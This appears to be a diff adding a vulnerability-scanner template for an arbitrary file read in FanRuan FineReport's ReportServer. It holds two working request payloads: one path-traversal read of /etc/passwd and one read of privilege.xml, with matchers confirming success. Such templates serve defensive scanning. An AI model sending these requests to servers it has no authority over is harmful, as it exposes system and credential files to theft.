@@ -1,0 +1,40 @@
+id: scopesentry-fanruan-reportserver-fileread
+
+info:
+  name: FanRuan ReportServer design_list_file Arbitrary File Read
+  author: scopesentry
+  severity: high
+  description: |
+    帆软 FineReport /WebReport/ReportServer 的 fs_remote_design + design_list_file 组合按 file_path 读文件。
+    判据：/etc/passwd 原文回显，或 privilege.xml 的 PrivilegeManager 结构回显（CNVD-2018-04757 同族）。
+  tags: finereport,fanruan,lfi,file-read
+  metadata:
+    verified: false
+    max-request: 2
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../etc/passwd&current_dir=/'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?i)<(PrivilegeManager|root|users)>'
+      - type: status
+        status:
+          - 200
